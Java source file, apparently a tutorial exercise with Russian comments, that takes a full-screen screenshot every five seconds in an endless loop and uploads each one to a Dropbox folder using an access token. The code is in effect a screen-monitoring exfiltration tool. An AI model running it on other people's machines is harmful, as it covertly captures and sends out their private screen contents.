package project;

import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import java.awt.*;
import java.awt.image.BufferedImage;

public class Main {

    public static void main (String[] args) throws AWTException {
        /*
        регистрируемся на Dropbox, создаем целевую папку
        куда будут отсылаться для хранения скрины,
        получаем для целевой папки ACCESS_TOKEN
         */

        String ACCESS_TOKEN = "***********************************************************";

        /*
         https://github.com/dropbox/dropbox-sdk-java
         отсюда забираем код для выполнения вызова API в Dropbox
         */

        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

        /*
        создаем полноэкранный скриншот
        создаем Uploader, передаем в конструктор вызов и скрин
        создаем отдельный Thread каждые 5 сек для отправки скрина
         */

        for(;;) {
            BufferedImage image =
                    new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            Uploader thread = new Uploader(client, image);
            thread.start();
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
